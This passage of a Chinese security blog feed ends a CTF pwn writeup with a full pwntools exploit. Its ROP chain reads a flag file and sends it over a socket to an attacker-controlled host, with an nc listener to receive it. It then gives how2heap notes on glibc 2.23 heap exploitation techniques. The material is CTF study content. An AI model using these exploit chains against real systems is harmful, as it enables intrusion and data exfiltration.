<p>socket 是 sys_socket 的封装函数，因此我们进行 sys_socket 的系统调用即可，其调用号为 41，同样的 sys_connect 的调用号为 42。</p>
<p>sys_socket 的参数我们需要设置为 AF_INET、SOCK_STREAM。这两个常量的值分别为 2 和 1。</p>
<p>sys_connect 的参数我们需要设置为 sockfd(socket 的文件描述符)、server_addr(struct sockaddr_in)、sockaddr_length。</p>
<p>其中我们需要构造一下的是 server_addr，sin_family=AF_INET、sin_prot=23946、sin_addr.s_addr=127.0.0.1，我们可以通过自己写c文件调试目的值得到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x server_addr</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  sin_family = 0x2, </span><br><span class="line">  sin_port = 0x8a5d, </span><br><span class="line">  sin_addr = &#123;</span><br><span class="line">    s_addr = 0x100007f</span><br><span class="line">  &#125;, </span><br><span class="line">  sin_zero = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中为 127.0.0.1:23946 的server_addr，其实需要的也就前八字节，最后得到 p64(0x100007f8a5d0002)+p64(0)*11。</p>
<p>c文件中的内容大致为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htons(<span class="number">23946</span>);<span class="comment">//转换成网络字节序，也就是大端序存储，端口随意</span></span><br><span class="line">server_addr.sin_addr.s_addr =  inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//转换成网络字节序，也就是转换为16进制数再大端序存储，远程的话修改为自己云服务器的ip</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>调试查看 server_addr 的内容即可</p>
<p>构造完后，再用 orw 向 sockfd 输出即可。其实一开始我用的是 sys_sendto，本地能打通远程不行，然后才用的 write，具体原因未知。</p>
<p>除此之外便是本地监听端口，要是不嫌麻烦，可以自己写个监听程序，大致为：socket+bind+listen+access(不建议)，或者用<code>nc -lvnp 23946</code>，来监听。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn3&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">8020</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x0000000000401350</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401355</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000401357</span></span><br><span class="line">pop_rdx=<span class="number">0x0000000000401353</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040135c</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401359</span></span><br><span class="line"></span><br><span class="line">hero=<span class="number">0x00000000004040A0</span></span><br><span class="line">flag=hero+<span class="number">0x200</span></span><br><span class="line">main=<span class="number">0x00000000004013D0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sys</span>(<span class="params">rax,rdi=<span class="number">0</span>,rsi=<span class="number">0</span>,rdx=<span class="number">0</span></span>):</span></span><br><span class="line">    payload=p64(pop_rdi)+p64(rdi)+p64(pop_rsi)+p64(rsi)+p64(pop_rdx)+p64(rdx)+p64(pop_rax)+p64(rax)+p64(syscall)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">ropchain=sys(<span class="number">2</span>,hero,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">ropchain+=sys(<span class="number">0</span>,<span class="number">0</span>,flag,<span class="number">0x100</span>)</span><br><span class="line">ropchain+=sys(<span class="number">41</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">ropchain+=sys(<span class="number">42</span>,<span class="number">1</span>,hero+<span class="number">376</span>,<span class="number">0x10</span>)</span><br><span class="line">ropchain+=sys(<span class="number">1</span>,<span class="number">1</span>,flag,<span class="number">0x100</span>)</span><br><span class="line">ropchain=ropchain.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=&#x27;./flag&#x27;.ljust(0x10,&#x27;\0&#x27;)+ropchain+p64(0x100007f8a5d0002)+p64(0)*11</span></span><br><span class="line">payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\0&#x27;</span>)+ropchain+p64(<span class="number">0x1abfcd748a5d0002</span>)+p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">ru(<span class="string">&quot;Which jungle hero would you choose?&quot;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="EDGvsDKgame4"><a href="#EDGvsDKgame4" class="headerlink" title="EDGvsDKgame4"></a>EDGvsDKgame4</h2><p>glibc 2.34 的题目，hint 给了是 <code>house of banana</code>，但是依旧没做出来。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>how2heap</title>
    <url>/2022/04/11/how2heap/</url>
    <content><![CDATA[<p>待续</p>
<span id="more"></span>

<h1 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h1><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>该demo通过分别释放不同的两个大小相等的堆，向我们展示了fastbin attack中的double_free。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastchunk被free之后会加入fastbin中，且在加入时会检查main_arena直接指向的地址(即链表头部)是否为当前释放的块。</p>
<p>因此当我们当前释放的堆不是最后释放时，无论是否被释放过都被释放。因此能够进行double-free，将该地址多次放入一条链中。</p>
<h3 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// double free 检测，其中 old 为 fastbin 链首 chunk，也就是说，free fastchunk 时仅检测链首与释放 chunk</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>该demo利用了该函数在fastbin中的机制：</p>
<ol>
<li>清空 fastbin(inuse位归0)</li>
<li>合并 fastbin</li>
<li>若后一块地址不为top chunk，则将合并的堆加入unsortedbin</li>
</ol>
<p>触发该函数的操作是，申请一个足够大的chunk。demo中申请了一个0x400大小的chunk，之后可以查看到p1被加入到了unsorted bin中。由于fastbin被清空，因此可以继续释放，使用dup进行攻击。</p>
<h3 id="相关源码-1"><a href="#相关源码-1" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过触发 malloc_consolidate 来对 fast_bin 进行清除</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))&#123;…………&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span>;</span><br></pre></td></tr></table></figure>

<p><a href="http://cn-sec.com/archives/285359.html">深度剖析malloc_consolidate</a></p>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>该demo展示了通过dup操作后，将一个内存块多次放入fastbin后的一次攻击示例。即将该块的用户空间的第一个地址(fd)改写为指定地址，通过申请相同大小就能申请到该空间。</p>
<p>但是要是想从fastbin中取出chunk，会对chunk_size进行检测，而该demo将栈上伪造的chunk的size也改了，因此才能申请成功。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>demo在栈上构造了一块chunk，并展示了将其成功释放后能够重新申请到。</p>
<p>程序中展示了构造一个fastchunk的过程，为了通过检测，主要是满足条件：</p>
<ul>
<li>fake_chunk的<code>ISMMAP</code>位不能为1</li>
<li>空间对齐</li>
<li>伪造next_size不能小于2*<code>SIZE_SZ</code>(16 on x64)，同时也不能大于<code>av-&gt;system_mem</code>(128kb by default for the main arena)</li>
</ul>
<p>可以看出，demo想说明的是：可以通过在指定位置构造fake_chunk来实现修改该地址的值。关键在于能够绕过对应的检测。</p>
<h3 id="相关源码-2"><a href="#相关源码-2" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// next_size 检测</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用top chunk的分配机制，实现任意地址分配。</p>
<p>demo展示了通过该技巧更改bss段上的一块地址的内容。</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
<li>能够控制top chunk的size域内容</li>
<li>能够自由控制分配大小</li>
</ol>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>从top chunk中申请内存时，过程中会调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder  = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top    = remainder;</span><br></pre></td></tr></table></figure>

<p>其中nb为用户的内存申请大小，victim为曾经top chunk的首地址，最后实现效果为调整top chunk为减去偏移后的地址。</p>
<p>那么再更新av-&gt;top时就会将top chunk迁移到任意地址，然后再次从top chunk中申请时，就会申请到该地址空间。</p>
<p>但由于再申请前会进行一次检测，确定top chunk的大小足够分配这个大小。所以我们需要修改top chunk size为最大值(其本身为无符号数，因此为-1)即可。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>需要修改的数据有：</p>
<ul>
<li>top_chunk_size=-1(或足够大数)</li>
<li>申请中的大小size=offset=top_chunk_size-target</li>
</ul>
<p>最后的效果：</p>
<ul>
<li>top_chunk被迁到target处</li>
</ul>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h3><ol>
<li>能够控制修改 freed_small_chunk 的 bk</li>
<li>能找到一个空间来伪造 fake_chunk，其 fd 为 freed_small_chunk</li>
</ol>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>demo展示了ptmalloc的机制：非fastchunk释放后会被放入unsortedbin中，而下次再次申请并在fastbin和unsortedbin中并没找到合适的chunk时，会将unsortedbin中的chunk按大小放入对应的bins中。</p>
<p>从smallbins中取chunk时，程序只会检查其bk-&gt;fd是否为当前chunk，而不会检查chunk_size。并且在samllbin中，取出chunk的顺序是FILO，因此我们伪造 fake_chnk 的 fd 为该 small_chunk，并修改 small_chunk 的 bk 为 fake_chunk,则能够将fake_chunk链入该small_bin。</p>
<h3 id="相关源码-3"><a href="#相关源码-3" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//需要通过此处检测</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>需要修改的数据：</p>
<ul>
<li>small_chunk_bk=target</li>
<li>(target+0x10)=small_chunk</li>
</ul>
<p>效果：<br>target 被链入该 small_bin。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h3><p>能够控制 prev_inuse 位和 prev_size。</p>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>demo展示了ptmalloc的合并机制：释放chunk后会检测prev_inuse是否为0和prev_size是否满足，而这些与伪造的chunk(demo是在栈上伪造的)都成功的话就会先合并低地址再合并高地址chunk。合并是根据prev_size的长度来决定合并后chunk的首地址，且若高地址chunk为top chunk则会再与top chunk合并，而合并后top chunk的位置将会是之前我们伪造的chunk处，demo中为top  chunk因为合并到了栈上。</p>
<h3 id="相关源码-4"><a href="#相关源码-4" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = p-&gt;prev_size;</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>需要修改的数据：</p>
<ul>
<li>prev_inuse 为 0</li>
<li>prev_size+chunk_size=prev_chunk_size</li>
</ul>
<p>效果：<br>合并</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>利用从top chunk中获取chunk的机制，不使用free函数就能达到得到一个free_chunk的功能。</p>
<h3 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h3><p>能够控制 top_chunk_size</p>
<p>  伪造 top_chunk_size 的条件：</p>
<ul>
<li>size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ul>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>当用户申请chunk，并且这个chunk需要从top chunk中获得时，如果遇到top chunk为不能满足能分配需求的大小时。会增大top chunk，根据arena的类型(main arena与non main arena)的不同会采用不同的扩展方法。而之前的top chunk会被放入unsorted bin中。</p>
<p>然后申请足够大小的chunk(大于修改的top_chunk_size)，然后 top chunk 被放入了unsorted bin中。此时就类似于我们没有使用free函数就得到了一个位于unsorted bin中的chunk。</p>
<p>最后使用 <a href="http://blog.rabb1t.xyz/2022/05/27/FSOP/">FSOP</a> 来 getshell。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>demo 演示了从 large_bin 中修改任意地址内容。</p>
<p>将 freed_largechunk 的 chunk_size 改为了 0x3f1, bk 改为 &amp;stack_val1-2, bk_nextsizes 改为了 stack_val2-4。</p>
<p>然后在执行 malloc(0x90) 时，修改了 stack_var1 与 stack_var2 的值。</p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>在执行 malloc，并且是从 unsortedbin 中分配 chunk 时，会先将 unsortedbin 中的 chunk 插入到对应的 bins 下，然后再根据申请的大小从对应的 bins 中申请。</p>
<p>而该攻击是在 chunk 的插入过程中，由于没有对 bk 与 bk-&gt;nextsize 进行检查而产生的。</p>
<h3 id="相关源码-5"><a href="#相关源码-5" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>在代码中，我们可以看到会执行一个循环，且由于<strong>一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向</strong>，因此该循环是遍历找出比当前 size 大的最小 chunk，存入 fwd。</p>
<p>此时，因为我们的 chunk_size 改为了 0x3f1，就不用遍历了。</p>
<p>接着执行<code>victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code></p>
<p>由于我们将 p2-&gt;bk_nextsize 修改为了 &amp;stack_var2-4。因此，在 p3 的插入中会等同于执行了 p3-&gt;bk_nextsize=p2-&gt;bk_nextsize=&amp;stack_var2-4，p3-&gt;bk_nextsize-&gt;fd_nextsize=*(&amp;stack_var2-4+4)=p3。</p>
<p>接着执行<code>bck = fwd-&gt;bk;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;</code></p>
<p>因为也将 p2-&gt;bk 修改为了 &amp;stack_var1-2，因此等同于执行了 p3-&gt;bk=bck=p2-&gt;bk=&amp;stack_var1-2，p3-&gt;bk-&gt;fd=p2-&gt;bk-&gt;fd=*(&amp;stack_var1-2+2)=p3。</p>
<p>最后的结果为两个栈上地址的值都修改为了 p3 的地址。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>demo 展示了改变栈上一个变量的值。</p>
<h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>从 unsorted_bin 中获取 chunk 时，不会对 bk 和 fd 进行检查就直接将该 chunk 从 unsorted_bin 中取出，然后将链表连上。</p>
<p>因此我们只需要改 bk 为 target_addr-0x10 即可。</p>
<h3 id="相关源码-6"><a href="#相关源码-6" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">……</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">……</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p>适用于 2.30 之前，可以造成任意写地址。</p>
<h3 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h3><ol>
<li>unsorted_bin &amp; large_bin 分别存在一个 chunk，且 unsorted_bin 中的 chunk 要大于 large_bin 中的 chunk</li>
<li>unsorted_bin 中的 bk 指针可控(设置为target)</li>
<li>large_bin 中的 bk 指针(设置为target+8)和 bk_nextsize 指针可控(设置为target-0x18-5)</li>
</ol>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>demo 首先在 unsorted_bin 和 large_bin 中分别插入了一个 chunk。且 unsorted_bin 中 chunk 的地址必须满足，并且使 chunk_size 的最高位字节为 0x56，因为这样设置后，largebin_chunk的bk_nextsize域指向的target_chunk的size域为0x56</p>
<p>接着设置<code>unsorted_bin-&gt;bk=target-0x10</code>，<code>large_bin-&gt;bk=target-0x8</code>，<code>large_bin-&gt;bk_nextsize=target-0x28-shift_amount(地址位移次数)</code>。</p>
<p>接着申请 alloc_size 大小即可申请到 target。</p>
<h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>主要是结合了 unsorted_bin_attack 和 large_bin_attack 来进行任意写。先利用 unsorted_bin_attack 来写入 bin_at(av,victim_index) 到 target，再利用 large_bin_attack 构造 fake_chunk 并将 target-0x10 的地址链入 unsorted_bin 中。</p>
<p>因此原理与 unsorted_bin_attack 和 large_bin_attack 的类似：malloc 从 unsorted_bin 中取出 chunk 时，若没有大小刚好合适的 chunk 会先将 unsorted_bin 中的 chunk 分配到 small_bin 和 large_bin 中。由于不会对 bk 和 fd 进行检查就直接将该 chunk 从 unsorted_bin 中取出，然后将链表连上，并且在插入 large_bin 时，也存在没有对 bk 与 bk-&gt;nextsize 进行检查。</p>
<h4 id="相关源码-7"><a href="#相关源码-7" class="headerlink" title="相关源码"></a>相关源码</h4><p>为插入 large_bins 且该 large_bins 不为空，同时 chunk_size 不是该 large_bins 中最小时所执行的代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">		&#123;</span><br><span class="line">			fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">			<span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">			fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			victim-&gt;fd_nextsize = fwd;</span><br><span class="line">			victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">			fwd-&gt;bk_nextsize = victim;</span><br><span class="line">			victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">		&#125;</span><br><span class="line">		bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br><span class="line">  mark_bin (av, victim_index);</span><br><span class="line">  victim-&gt;bk = bck;</span><br><span class="line">  victim-&gt;fd = fwd;</span><br><span class="line">  fwd-&gt;bk = victim;</span><br><span class="line">  bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>此处 victim = unsorted_bin，fwd = large_bin，且由于我们更改了 unsorted_bin-&gt;bk=target-0x10，large_bin-&gt;bk=target-0x8，large_bin-&gt;bk_nextsize=target-0x28-shift_amount，因此等同于执行了：</p>
<ul>
<li><p>*(unsorted_bin+0x20) = large_bin;</p>
</li>
<li><p>*(unsorted_bin+0x28) = target-0x28-shift_amount;</p>
</li>
<li><p>large_bin-&gt;bk_nextsize = unsorted_bin;</p>
</li>
